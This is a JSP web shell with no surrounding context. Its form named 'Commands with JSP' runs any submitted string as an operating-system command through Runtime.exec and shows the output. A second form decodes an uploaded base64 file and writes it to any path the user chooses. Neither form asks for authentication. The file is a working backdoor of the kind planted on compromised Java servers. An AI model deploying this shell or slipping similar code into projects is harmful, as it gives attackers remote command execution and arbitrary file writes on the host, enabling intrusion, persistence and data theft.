<%@page import="java.util.*,java.io.*,java.net.*,javax.xml.bind.*"%>
<%!
	public String v(String w){
		String x="";
		try{
			x=URLDecoder.decode(w,"UTF-8");
		}catch(Exception e){}
		return x;
	}
%>
<HTML>
	<BODY>
		Commands with JSP
		<FORM METHOD="post" ACTION="">
			<INPUT TYPE="text" NAME="c">
			<INPUT TYPE="submit" VALUE="run">
		</FORM>
        
    <div>
    <hr>
    <form action="" method="post">Upload dir: <input name="a" value="." type="text"><br>Select a file to upload: <input name="n" id="f" type="file"><input name="b" id="b" type="hidden"><input value="Upload" type="submit"></form>
    <hr></div>
    
		<div>
        <%
		String o,l,d;
        o=l=d="";
        DataInputStream r=new DataInputStream(request.getInputStream());
        while((l=r.readLine())!=null){
            d+=l;
        }
        if(d.indexOf("c=")>=0){
            String g=v(d.substring(2));
            String s;
            try{
                Process p=Runtime.getRuntime().exec(g);
                DataInputStream i=new DataInputStream(p.getInputStream());
                out.print("<pre>");
                while((s=i.readLine())!=null){
                    o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";
                }
                out.print(o);
            }catch(Exception e){
                out.print(e);
            }
        }else{
            if(d.length()>1){
                int b=d.indexOf("b=");
                int n=d.indexOf("n=");
                byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));
                String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));
                try{
                    OutputStream stream=new FileOutputStream(f);
                    stream.write(m);
                    o="Uploaded: "+f;
                    out.print(o);
                }catch(Exception e){
                    out.print(e);
                }
            }
        }
		%>
		</div>
        
        <script>

        var handleFileSelect = function(evt) {
            var files = evt.target.files;
            var file = files[0];

            if (files && file) {
                var reader = new FileReader();

                reader.onload = function(readerEvt) {
                    var binaryString = readerEvt.target.result;
                    document.getElementById('b').value = btoa(binaryString);
                };

                reader.readAsBinaryString(file);
            }
        };
        if (window.File && window.FileReader && window.FileList && window.Blob) {
            document.getElementById('f').addEventListener('change', handleFileSelect, false);
        } else {
            alert('The File APIs are not fully supported in this browser.');
        }
        </script></BODY>    
</HTML>
